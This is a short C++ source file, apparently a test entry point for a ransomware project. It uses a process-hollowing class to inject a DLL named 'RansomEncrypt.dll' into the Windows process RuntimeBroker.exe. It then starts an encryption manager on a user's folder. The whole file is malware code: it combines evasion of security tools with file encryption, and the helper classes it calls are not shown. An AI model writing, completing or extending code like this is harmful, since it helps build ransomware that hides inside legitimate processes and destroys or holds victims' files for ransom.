#include "crypt/CryptManager.h"
#include "evasion/ProcessHollowing.h"

inline void start_testing() {
    ProcessHollowing hollowing;

    hollowing.InjectDLL("C:\\Windows\\System32\\RuntimeBroker.exe", "RansomEncrypt.dll");
    CryptManager cryptManger(0x33);
    cryptManger.start(L"C:\\Users\\cain\\testing");
}